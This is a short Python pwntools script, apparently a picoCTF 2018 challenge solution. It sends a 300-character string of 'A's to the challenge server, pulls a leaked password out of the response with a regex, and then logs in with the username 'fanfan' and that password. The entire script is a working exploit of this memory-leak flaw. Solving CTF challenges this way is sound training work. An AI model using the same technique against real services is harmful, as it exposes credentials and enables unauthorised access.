from pwn import *
import re
import time 

#get passwd
s = remote('2018shell.picoctf.com', 1271) 
print s.recv()
s.sendline('A' * 300)

time.sleep(0.5)

pwd = s.recv()
print pwd
pwd = re.findall(r'A+,(.+)',pwd)[0].strip()
s.close()


#input passwd
s = remote('2018shell.picoctf.com', 1271)
print s.recv()
s.sendline('fanfan')
print s.recv()
s.sendline(pwd)
time.sleep(0.5)
print s.recv()

s.close()
